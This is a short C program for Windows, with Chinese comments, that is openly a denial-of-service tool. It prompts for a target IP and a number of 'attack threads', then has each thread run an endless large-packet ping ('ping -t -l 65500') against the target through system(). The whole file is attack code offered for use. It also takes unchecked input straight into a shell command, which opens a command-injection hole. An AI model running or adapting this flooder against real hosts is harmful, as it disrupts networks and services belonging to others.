#include <stdio.h>
#include <windows.h>

#define MaxSize 50
#define MaxThreadNum 128

HANDLE ThreadHandle[MaxThreadNum]; //线程句柄
DWORD ThreadID[MaxThreadNum];      //线程ID

DWORD WINAPI DDosServer(LPVOID IP_Address)
{
    //初始化ping命令
    char Command[MaxSize] = "ping \0";
    //IP格式转化
    char *IP = (char *)IP_Address;
    //拼接IP
    strcat(Command, IP);
    //拼接ping命令参数(方式、缓冲区大小、请求数)
    //同时保证可控
    strcat(Command, " -t -l 65500\0");
    //执行ping命令
    //这个命令不会结束，程序无法正常终止
    system(Command);
    return 0;
}

int main()
{
    int ThreadNum = 8;
    char IP[16] = {0};

    //输入目标主机IP
    printf("请输入目标主机IP: ");
    scanf("%s", IP);

    printf("请输入攻击线程数：");
    scanf("%d", &ThreadNum);

    for (int i = 0; i < ThreadNum; ++i)
    {
        ThreadHandle[i] = CreateThread(NULL, 0, DDosServer, &IP, 0, &ThreadID[i]);
        if (ThreadHandle != NULL)
            printf("攻击线程%d创建成功！\n", i);
        else
            printf("攻击线程%d创建失败！\n", i);
    }

    //等待全部线程结束
    WaitForMultipleObjects(ThreadNum, ThreadHandle, TRUE, INFINITE);

    for (int i = 0; i < ThreadNum; ++i)
    {
        //关闭线程句柄
        //TerminateThread(ThreadHandle[i], 0);
        if (CloseHandle(ThreadHandle[i]) == true)
            printf("攻击线程%d结束成功！\n", i);
    }
    return 0;
}